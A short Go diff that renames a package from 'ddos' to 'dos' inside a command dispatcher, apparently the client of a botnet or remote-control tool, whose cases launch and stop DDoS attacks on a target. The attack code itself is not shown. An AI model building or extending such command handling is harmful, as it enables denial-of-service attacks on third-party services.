@@ -30,9 +30,9 @@ func Execute(command string, target string, args string) {
 		case "web":
 			break
 		case "ddos":
-			ddos.DdosApi(100, args)
+			dos.DdosApi(100, args)
 		case "sdd":
-			ddos.StopDdos()
+			dos.StopDdos()
 		case "pass":
 			break
 		case "upgrade":
